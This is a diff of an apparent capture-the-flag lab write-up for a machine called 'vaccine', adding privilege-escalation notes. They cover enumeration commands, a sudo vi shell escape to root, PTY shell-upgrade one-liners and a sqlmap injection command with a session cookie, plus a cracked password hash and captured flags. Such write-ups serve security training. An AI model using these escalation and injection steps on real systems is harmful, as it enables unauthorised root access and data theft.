@@ -58,7 +58,7 @@ Time to dehash. No solt required.
 
 	2cb42f8734ea607eefed3b70af13bbd3:qwerty789  
 	
-	Need to use better passwords..  
+	Use better passwords..  
 
 `>> seems like nothing interestion in there... we are not the super admin yet. More like a content admin.`  
 
@@ -92,8 +92,46 @@ $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres passwor
 
 The same password is ok for ssh apparently.  
 
->> postgres@vaccine:~$ cat user.txt  
+`postgres@vaccine:~$ cat user.txt`  
 139d3e5c3db18073d250ce0dccc43997  
 
+Time to escalate  
+https://payatu.com/guide-linux-privilege-escalation  
+
+`netstat -antup`  
+Any root owned listeners? No.  
+
+`ps -aux | grep root`  
+Interesting root processess?  
+Apache and www are owned by root. Cannot write there.
+
+`id`  
+uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)  
+
+`find / -perm -u=s -type f 2>/dev/null`  
+Any SUID executables?  
+
+`sudo -l`  
+What can user sudo to?  
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf 
+
+Oh really?  
+`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`  
+
+`:!bash`  
+
+`whoami`  
+root   
+
+`cat root.txt`  
+dd6e058e814260bc70e9bbdef2715849  
 
 
+PostEx  
+
+Shell upgrade  
+`SHELL=/bin/bash script -q /dev/null`  
+`python3 -c "import pty; pty.spawn('/bin/bash')"  
+
+SQLi  
+`sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"`  
